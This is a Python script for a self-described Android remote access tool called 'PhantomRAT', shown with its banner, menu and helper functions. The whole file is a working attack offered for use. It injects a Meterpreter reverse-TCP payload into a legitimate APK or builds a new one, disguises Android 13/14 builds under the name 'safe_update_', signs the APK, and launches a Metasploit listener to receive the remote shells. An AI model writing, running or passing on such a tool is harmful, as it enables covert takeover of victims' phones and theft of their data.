import os
import shutil
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel

console = Console()

# ====== Banner ======
def banner():
    os.system("clear")
    console.print(Panel("""[bold red]
██████╗ ██╗  ██╗ █████╗ ███╗   ███╗████████╗ ██████╗ ███╗   ██╗██████╗
██╔══██╗██║  ██║██╔══██╗████╗ ████║╚══██╔══╝██╔═══██╗████╗  ██║██╔══██╗
██████╔╝███████║███████║██╔████╔██║   ██║   ██║   ██║██╔██╗ ██║██║  ██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║   ██║   ██║   ██║██║╚██╗██║██║  ██║
██║     ██║  ██║██║  ██║██║ ╚═╝ ██║   ██║   ╚██████╔╝██║ ╚████║██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═════╝[/bold red]
[cyan]        Remote Access Tool | Undetectable | Silent[/cyan]
    """, title="[bold magenta]PhantomRAT v2.0[/bold magenta]", expand=False))

# ====== Dependency Check ======
def check_dependencies():
    console.print("\n[bold cyan]Checking required tools...[/bold cyan]")
    tools = ["msfvenom", "msfconsole", "zipalign", "apksigner"]
    missing = []
    for tool in tools:
        if shutil.which(tool) is None:
            console.print(f"[red]✘ {tool} not found[/red]")
            missing.append(tool)
        else:
            console.print(f"[green]✔ {tool} found[/green]")
    if missing:
        console.print(f"\n[bold red]Missing tools:[/bold red] {', '.join(missing)}")
        console.print("[yellow]Install them before using the tool.[/yellow]")
        exit()

# ====== Main Menu ======
def main_menu():
    banner()
    check_dependencies()

    console.print("\n[bold blue][1][/bold blue] Generate Payload (custom APK)")
    console.print("[bold blue][2][/bold blue] Start Listener")
    console.print("[bold blue][0][/bold blue] Exit")

    choice = Prompt.ask("\n[bold cyan]Select Option[/bold cyan]", choices=["1", "2", "0"])

    if choice == "1":
        generate_payload()
    elif choice == "2":
        start_listener()
    else:
        console.print("[green]Goodbye![/green]")
        exit()

# ====== Payload Generator ======
def generate_payload():
    console.print("\n[bold green]Payload Generator[/bold green]")
    print("\n[1] Modify existing APK")
    print("[2] Build new custom APK")
    sub_choice = Prompt.ask("Select Option", choices=["1", "2"])

    ip = Prompt.ask("LHOST (Your IP)")
    port = Prompt.ask("LPORT (e.g. 8080)")
    android_version = Prompt.ask("Android Version (10, 11, 12, 13, 14)")
    
    if sub_choice == "1":
        apk_path = input("Path to existing APK > ")
        output = f"infected_{android_version}.apk"
        console.print(f"[yellow][*][/yellow] Injecting payload into [bold]{apk_path}[/bold]...")
        os.system(f"msfvenom -x {apk_path} -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} "
                  f"--platform android -a dalvik -o {output}")
        console.print(f"[green][+] Payload saved as {output}[/green]")

    elif sub_choice == "2":
        apk_name = input("Custom APK name (e.g., hacked.apk) > ")
        payload_name = f"safe_update_{apk_name}" if android_version in ["13", "14"] else apk_name
        console.print(f"[yellow][*][/yellow] Generating payload as [bold]{payload_name}[/bold]...")
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} "
                  f"--platform android -a dalvik -o {payload_name}")

        aligned = payload_name.replace(".apk", "_aligned.apk")
        signed = payload_name.replace(".apk", "_signed.apk")

        console.print("[cyan][*][/cyan] Aligning APK...")
        os.system(f"zipalign -v 4 {payload_name} {aligned}")

        console.print("[cyan][*][/cyan] Signing APK...")
        os.system(f"apksigner sign --ks my-release-key.jks --ks-key-alias myalias --out {signed} {aligned}")

        console.print(f"[green][+] Final Signed Payload: {signed}[/green]")

# ====== Listener ======
def start_listener():
    console.print("\n[bold yellow]Starting Listener[/bold yellow]")
    ip = Prompt.ask("LHOST (your IP)")
    port = Prompt.ask("LPORT")

    os.system(f'''msfconsole -q -x "
use exploit/multi/handler;
set payload android/meterpreter/reverse_tcp;
set LHOST {ip};
set LPORT {port};
exploit
"''')

# ====== Start Tool ======
if __name__ == "__main__":
    main_menu()
